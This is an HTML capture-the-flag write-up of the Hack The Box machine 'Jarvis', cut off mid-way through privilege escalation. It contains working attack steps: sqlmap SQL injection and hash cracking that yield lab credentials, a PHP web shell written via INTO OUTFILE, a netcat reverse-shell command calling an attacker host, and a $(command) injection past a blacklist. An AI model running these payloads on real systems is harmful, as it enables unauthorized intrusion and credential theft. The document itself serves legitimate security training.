@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Jarvis</strong></h1>
+        <em>Released: 22nd June 2019 / Pwned: June 27th 2019 - [+] Solved whilst Active</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Jarvis, whilst being a "medium" difficulty box, was fairly straight forward for me. The vulns were all classics. I think this was my first hackthebox machine where everything was smooth sailing. Rejoice!<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Find <code>/phpmyadmin</code> using gobuster<br>
+        • Find a sql injectable URL by manually browsing the site - <code>/room.php?cod=1</code><br>
+        • Use sqlmap to retrieve and crack credentials<br>
+        • Use credentials to access <code>/phpmyadmin</code> and get a reverse shell<br>
+        • Escalate from <code>www-data</code> to <code>pepper</code> using sudo permissions and a script vulnerable to command injection<br>
+        • Configure ssh access to <code>pepper</code> for a more reliable shell<br>
+        • Escalate to root by exploiting a suid binary and writing our own (malicious) service in <code>/home/pepper</code><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.143</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/jarvis#&nbsp;nmap&nbsp;-sC&nbsp;-sV&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.143<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.039s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;998&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4p1&nbsp;Debian&nbsp;10+deb9u6&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;2048&nbsp;03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67&nbsp;(RSA)<br>
+                |&nbsp;&nbsp;&nbsp;256&nbsp;25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6&nbsp;(ECDSA)<br>
+                |_&nbsp;&nbsp;256&nbsp;77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1&nbsp;(ED25519)<br>
+                80/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;((Debian))<br>
+                |&nbsp;http-cookie-flags:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;/:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PHPSESSID:&nbsp;<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;httponly&nbsp;flag&nbsp;not&nbsp;set<br>
+                |_http-server-header:&nbsp;Apache/2.4.25&nbsp;(Debian)<br>
+                |_http-title:&nbsp;Stark&nbsp;Hotel<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(If&nbsp;you&nbsp;know&nbsp;what&nbsp;OS&nbsp;is&nbsp;running&nbsp;on&nbsp;it,&nbsp;see&nbsp;https://nmap.org/submit/&nbsp;).<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        A full port scan revealed 2 extra ports:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis#&nbsp;nmap&nbsp;-p-&nbsp;-sV&nbsp;-T4&nbsp;-oN&nbsp;nmap/full.txt&nbsp;10.10.10.143<br>
+                ...<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.059s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;65531&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;SERVICE&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;7.4p1&nbsp;Debian&nbsp;10+deb9u6&nbsp;(protocol&nbsp;2.0)<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;((Debian))<br>
+                5355/tcp&nbsp;&nbsp;filtered&nbsp;llmnr<br>
+                64999/tcp&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.4.25&nbsp;((Debian))<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Linux;&nbsp;CPE:&nbsp;cpe:/o:linux:linux_kernel<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <strong>Services running:</strong><br>
+        • 22/ssh - nothing to do here<br>
+        • 80/http - looks like a website for a hotel<br>
+        • 5355/llmnr - llmnr stands for <em>Link-Local Multicast Name Resolution</em>. There's nothing to do here either.<br>
+        • 6499/http - another website (which is just a rabbit hole, I think)<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Ports &amp; Services</strong></h1>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - Stark Hotel</strong></h2><br>
+        <code>http://10.10.10.143/</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        It's a website for a hotel. A “super secure" one at that.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>2a) Gobuster</strong></h3><br>
+        <code>gobuster</code> finds the <code>phpmyadmin</code> directory for us.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis/80-http#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.143/&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt&nbsp;-o&nbsp;gb-common.txt<br>
+                <br>
+                =====================================================<br>
+                Gobuster&nbsp;v2.0.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)<br>
+                =====================================================<br>
+                [+]&nbsp;Mode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;dir<br>
+                [+]&nbsp;Url/Domain&nbsp;&nbsp;&nbsp;:&nbsp;http://10.10.10.143/<br>
+                [+]&nbsp;Threads&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10<br>
+                [+]&nbsp;Wordlist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt<br>
+                [+]&nbsp;Status&nbsp;codes&nbsp;:&nbsp;200,204,301,302,307,403<br>
+                [+]&nbsp;Expanded&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;true<br>
+                [+]&nbsp;Timeout&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10s<br>
+                =====================================================<br>
+                2019/06/27&nbsp;10:08:10&nbsp;Starting&nbsp;gobuster<br>
+                =====================================================<br>
+                http://10.10.10.143/.hta&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.143/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.143/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                http://10.10.10.143/css&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.143/fonts&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.143/images&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.143/index.php&nbsp;(Status:&nbsp;200)<br>
+                http://10.10.10.143/js&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.143/phpmyadmin&nbsp;(Status:&nbsp;301)<br>
+                http://10.10.10.143/server-status&nbsp;(Status:&nbsp;403)<br>
+                =====================================================<br>
+                2019/06/27&nbsp;10:08:35&nbsp;Finished<br>
+                =====================================================
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>2b) /room.php?cod=1</strong></h3><br>
+        Manually browsing the site, you should see some rooms being advertised - <code>http://10.10.14.11/rooms-suites.php</code><br>
+        Following the link to an individual room, you'll find a suspicious looking url - <code>http://10.10.10.143/room.php?cod=1</code><br>
+        <br>
+        Considering this URL - <code>http://10.10.10.143/room.php?cod=1</code> - was retrieving information about a room, as well as the fact that <code>gobuster</code> found a phpmyadmin page, I guessed that this <code>cod=1</code> paremeter might be vulnerable to SQL injection.<br>
+        <br>
+        If you don't care about manually checking for SQL injection, skip to <em>2d)</em>.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>2c) Test <code>cod=1</code> for SQL injection manually</strong></h3><br>
+        <strong>1) Test for SQL injection #1</strong><br>
+        <code>http://10.10.10.143/room.php?cod=1-false</code> should return a TRUE if it's vulnerable.<br>
+        i.e. we'll get our information.<br>
+        It does.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <strong>2) Test for SQL injection #2</strong><br>
+        <code>http://10.10.10.143/room.php?cod=1-true</code> should return FALSE if it's vulnerable.<br>
+        i.e. we won't get our information.<br>
+        It does! None of the databse information gets printed out.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <br>
+        <strong>3) Find number of columns</strong><br>
+        You can find the number of columns by using <code>order by</code> and gradually increasing the number of columns.<br>
+        Once you reach an error, subtract 1 to find the numebr of columns.<br>
+        <br>
+        In this instance, order by 7 acts normal - <code>http://10.10.10.143/room.php?cod=1 order by 1,2,3,4,5,6,7</code><br>
+        Order by 8 doesn't return any output - <code>http://10.10.10.143/room.php?cod=1 order by 1,2,3,4,5,6,7,8</code><br>
+        <br>
+        Now we know that there are 7 columns in the table.<br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        I couldn't figure out how to get database information to print out to the screen, so I gave up on manual injection at this point and moved to <code>sqlmap</code>.<br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>2d) sqlmap</strong></h3><br>
+        Exploit the <code>cod=1</code> parameter using sqlmap and retrieve the databases.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis/80-http#&nbsp;sqlmap&nbsp;-u&nbsp;http://10.10.10.143/room.php?cod=1&nbsp;--dbs<br>
+                ...<br>
+                available&nbsp;databases&nbsp;[5]:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                [*]&nbsp;hotel<br>
+                [*]&nbsp;information_schema<br>
+                [*]&nbsp;jnmxv<br>
+                [*]&nbsp;mysql<br>
+                [*]&nbsp;performance_schema<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        <code>mysql</code> looks the most interesting. Have a look at <code>mysql</code>'s tables.<br>
+        I've excluded the results because wall of text.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis/80-http#&nbsp;sqlmap&nbsp;-u&nbsp;http://10.10.10.143/room.php?cod=1&nbsp;-D&nbsp;mysql&nbsp;--tables<br>
+                ...<br>
+                Database:&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                [30&nbsp;tables]<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        The interesting table from this list is <code>user</code>.<br>
+        <br>
+        Have a look at <code>user</code>'s columns.<br>
+        I've again excluded the results because wall of text.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis/80-http#&nbsp;sqlmap&nbsp;-u&nbsp;http://10.10.10.143/room.php?cod=1&nbsp;-D&nbsp;mysql&nbsp;-T&nbsp;user&nbsp;--columns<br>
+                ...<br>
+                Database:&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                Table:&nbsp;user<br>
+                [46&nbsp;columns]<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        The interesting colums are:<br>
+        • User<br>
+        • Password<br>
+        <br>
+        Those 2 columns should give us a username and password. I used <code>sqlmap</code>'s dictionary cracking functionality to crack the MySQL hash it recovered using <code>rockyou.txt</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis/80-http#&nbsp;sqlmap&nbsp;-u&nbsp;http://10.10.10.143/room.php?cod=1&nbsp;-D&nbsp;mysql&nbsp;-T&nbsp;user&nbsp;-C&nbsp;User,Password&nbsp;--dump<br>
+                ...<br>
+                do&nbsp;you&nbsp;want&nbsp;to&nbsp;store&nbsp;hashes&nbsp;to&nbsp;a&nbsp;temporary&nbsp;file&nbsp;for&nbsp;eventual&nbsp;further&nbsp;processing&nbsp;with&nbsp;other&nbsp;tools&nbsp;[y/N]&nbsp;n<br>
+                do&nbsp;you&nbsp;want&nbsp;to&nbsp;crack&nbsp;them&nbsp;via&nbsp;a&nbsp;dictionary-based&nbsp;attack?&nbsp;[Y/n/q]&nbsp;y<br>
+                [11:22:57]&nbsp;[INFO]&nbsp;using&nbsp;hash&nbsp;method&nbsp;'mysql_passwd'<br>
+                what&nbsp;dictionary&nbsp;do&nbsp;you&nbsp;want&nbsp;to&nbsp;use?<br>
+                [1]&nbsp;default&nbsp;dictionary&nbsp;file&nbsp;'/usr/share/sqlmap/data/txt/wordlist.tx_'&nbsp;(press&nbsp;Enter)<br>
+                [2]&nbsp;custom&nbsp;dictionary&nbsp;file<br>
+                [3]&nbsp;file&nbsp;with&nbsp;list&nbsp;of&nbsp;dictionary&nbsp;files<br>
+                &gt;&nbsp;2<br>
+                what's&nbsp;the&nbsp;custom&nbsp;dictionary's&nbsp;location?<br>
+                &gt;&nbsp;/usr/share/wordlists/rockyou.txt<br>
+                [11:23:10]&nbsp;[INFO]&nbsp;using&nbsp;custom&nbsp;dictionary<br>
+                do&nbsp;you&nbsp;want&nbsp;to&nbsp;use&nbsp;common&nbsp;password&nbsp;suffixes?&nbsp;(slow!)&nbsp;[y/N]&nbsp;n<br>
+                [11:23:12]&nbsp;[INFO]&nbsp;starting&nbsp;dictionary-based&nbsp;cracking&nbsp;(mysql_passwd)<br>
+                [11:23:12]&nbsp;[INFO]&nbsp;starting&nbsp;2&nbsp;processes&nbsp;<br>
+                [11:23:12]&nbsp;[INFO]&nbsp;cracked&nbsp;password&nbsp;'imissyou'&nbsp;for&nbsp;hash&nbsp;'*2d2b7a5e4e637b8fba1d17f40318f277d29964d0'&nbsp;<br>
+                Database:&nbsp;mysql<br>
+                Table:&nbsp;user<br>
+                [1&nbsp;entry]<br>
+                +---------+------------------------------------------------------+<br>
+                |&nbsp;User&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;Password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                +---------+------------------------------------------------------+<br>
+                |&nbsp;DBadmin&nbsp;|&nbsp;*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0&nbsp;(imissyou)&nbsp;|<br>
+                +---------+------------------------------------------------------+
+            </div>
+        </div><br>
+        <br>
+        We have credentials!<br>
+        <code>DBadmin / imissyou</code><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) /phpmyadmin</strong></h2><br>
+        Log in to <code>http://10.10.10.143/phpmyadmin</code> using the <code>DBadmin</code> credentials recovered via sql injection:<br>
+        <code>DBadmin / imissyou</code><br>
+        <br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        Using SQL's <code>into outfile</code> statement and phpmyadmin's web interface, we can write a php file to the system and get ourselves a reverse shell.<br>
+        <br>
+        <a id="h3-6" name="h3-6"></a><strong></strong>
+        <h3><strong>3a) Upload .php file</strong></h3><br>
+        Pick a table to run SQL queries on.<br>
+        I chose <code>jnmxv</code> because it looked like a dummy table. You could pick any.<br>
+        <br>
+        Click the <em>SQL</em> tab so that we can run SQL commands.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        This SQL statement<br>
+        <code>SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/shell5000.php"</code><br>
+        will write a php file called <code>shell5000.php</code> to the filesystem.<br>
+        <br>
+        Write your statement into the text box and click ‘Go’ to run the SQL query.<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        The query ran successfully :)<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Now to run commands, visit:<br>
+        <code>http://10.10.10.143/shell5000.php?cmd=&lt;command&gt;</code><br>
+        <br>
+        For example, to run <code>id</code> visit:<br>
+        <code>http://10.10.10.143/shell5000.php?cmd=id</code><br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        <a id="h3-7" name="h3-7"></a><strong></strong>
+        <h3><strong>3b) Reverse shell</strong></h3><br>
+        Get a reverse shell by a starting a listener on your attacking machine<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jarvis#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run <code>nc &lt;attacker ip&gt; &lt;listening port&gt; -e /bin/bash</code><br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        You should receive a shell!<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.11]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.143]&nbsp;44036<br>
+                id<br>
+                uid=33(www-data)&nbsp;gid=33(www-data)&nbsp;groups=33(www-data)<br>
+                python&nbsp;-c&nbsp;'import&nbsp;pty;&nbsp;pty.spawn("/bin/bash")'&nbsp;<br>
+                www-data@jarvis:/var/www/html$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-4" name="h1-4"></a><strong></strong>
+        <h1><strong>Priv-Esc</strong></h1>
+        There's 2 stages of priv-esc you have to complete in order to get root on this machine.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) www-data to pepper</strong></h2><br>
+        Check what sudo permissions <code>www-data</code> has.<br>
+        This took me a bit to find since <code>www-data</code> shouldn't normally have <code>sudo</code> permissions.<br>
+            <div class="codebox">
+                www-data@jarvis:/var/www/html$&nbsp;sudo&nbsp;-l<br>
+                Matching&nbsp;Defaults&nbsp;entries&nbsp;for&nbsp;www-data&nbsp;on&nbsp;jarvis:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;env_reset,&nbsp;mail_badpass,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br>
+                <br>
+                User&nbsp;www-data&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;jarvis:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(pepper&nbsp;:&nbsp;ALL)&nbsp;NOPASSWD:&nbsp;/var/www/Admin-Utilities/simpler.py
+            </div>
+        </div><br>
+        <br>
+        We can run as user <code>pepper</code> an 'admin utility' named <code>simpler.py</code>.<br>
+        Have a look.<br>
+            <div class="codebox">
+                www-data@jarvis:/var/www/html$&nbsp;cat&nbsp;/var/www/Admin-Utilities/simpler.py<br>
+                ...<br>
+                ********************************************************<br>
+                *&nbsp;Simpler&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;A&nbsp;simple&nbsp;simplifier&nbsp;;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<br>
+                *&nbsp;Version&nbsp;1.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*<br>
+                ********************************************************<br>
+                Usage:&nbsp;&nbsp;python3&nbsp;simpler.py&nbsp;[options]<br>
+                <br>
+                Options:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;-h/--help&nbsp;&nbsp;&nbsp;:&nbsp;This&nbsp;help<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;-s&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Statistics<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;-l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;List&nbsp;the&nbsp;attackers&nbsp;IP<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;-p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ping&nbsp;an&nbsp;attacker&nbsp;IP<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;'''<br>
+                ....
+            </div>
+        </div><br>
+        <br>
+        The help message shows the option of a ‘ping’ functionality.<br>
+        This reeks of command injection.<br>
+        <br>
+        If you investigate the script's <code>exec_ping()</code> function you'll find the command injection vulnerability:<br>
+        • Line 127 - <code>os.system('ping ' + command)</code><br>
+        <br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        • <code>os.system()</code> runs system commands<br>
+        • <code>command = input('Enter an IP: ')</code> takes user input.<br>
+        • And <code>os.system('ping ' + command)</code> appends our user input to the Linux <code>ping</code> command and runs it.<br>
+        <br>
+        However, the developer has written a blacklist:<br>
+        <code>forbidden = ['&amp;', ';', '-', '`', '||', '|']</code><br>
+        <br>
+        If these characters are found in our input then the script will exit.<br>
+        This is the developer trying to prevent command injection.<br>
+        <br>
+        However, the developer has forgotten to blacklist 1 extra injection sequence - <code>$(&lt;command&gt;)</code><br>
+        <br>
+        Since this script is running as user <code>pepper</code>, we can use our code injection to run commands as <code>pepper</code> and get an elevated shell.<br>
+        <br>
+        <a id="h3-8" name="h3-8"></a><strong></strong>
+        <h3><strong>4a) Exploit simpler.py</strong></h3><br>
+        Exploit <code>simpler.py</code>'s code injection vuln using <code>$(&lt;command&gt;)</code> to get a shell as <code>pepper</code>.<br>
+            <div class="codebox">
+                www-data@jarvis:/var/www/html$&nbsp;sudo&nbsp;-u&nbsp;pepper&nbsp;/var/www/Admin-Utilities/simpler.py&nbsp;-p<br>
+                ***********************************************<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                &nbsp;___(_)_&nbsp;__&nbsp;___&nbsp;&nbsp;_&nbsp;__&nbsp;|&nbsp;|&nbsp;___&nbsp;_&nbsp;__&nbsp;_&nbsp;__&nbsp;&nbsp;_&nbsp;&nbsp;&nbsp;_&nbsp;<br>
+                /&nbsp;__|&nbsp;|&nbsp;'_&nbsp;`&nbsp;_&nbsp;\|&nbsp;'_&nbsp;\|&nbsp;|/&nbsp;_&nbsp;\&nbsp;'__|&nbsp;'_&nbsp;\|&nbsp;|&nbsp;|&nbsp;|<br>
+                \__&nbsp;\&nbsp;|&nbsp;|&nbsp;|&nbsp;|&nbsp;|&nbsp;|&nbsp;|_)&nbsp;|&nbsp;|&nbsp;&nbsp;__/&nbsp;|_&nbsp;|&nbsp;|_)&nbsp;|&nbsp;|_|&nbsp;|<br>
+                |___/_|_|&nbsp;|_|&nbsp;|_|&nbsp;.__/|_|\___|_(_)|&nbsp;.__/&nbsp;\__,&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|_|&nbsp;&nbsp;&nbsp;&nbsp;|___/&nbsp;<br>
